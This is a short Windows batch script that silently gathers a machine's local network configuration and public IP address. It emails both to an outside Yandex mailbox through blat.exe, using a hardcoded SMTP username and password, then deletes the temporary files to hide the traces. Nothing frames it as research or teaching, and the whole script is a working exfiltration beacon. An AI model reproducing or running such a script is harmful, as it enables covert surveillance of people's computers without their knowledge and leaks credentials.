@echo off

ipconfig /all > localip.txt
realip.exe > realip.txt

ping -n 2 127.0.0.1 > nul

blat.exe -install -server smtp.yandex.ru -port 25 -f imprimatur2305@yandex.ru -u imprimatur2305 -pw 80661745996
blat.exe -to imprimatur2305@yandex.ru -subject "Local IP" -attachi "localip.txt" -body "Locals IP"
blat.exe -to imprimatur2305@yandex.ru -subject "Real IP" -attachi "realip.txt" -body "Real IP"

del /f /q localip.txt
del /f /q realip.txt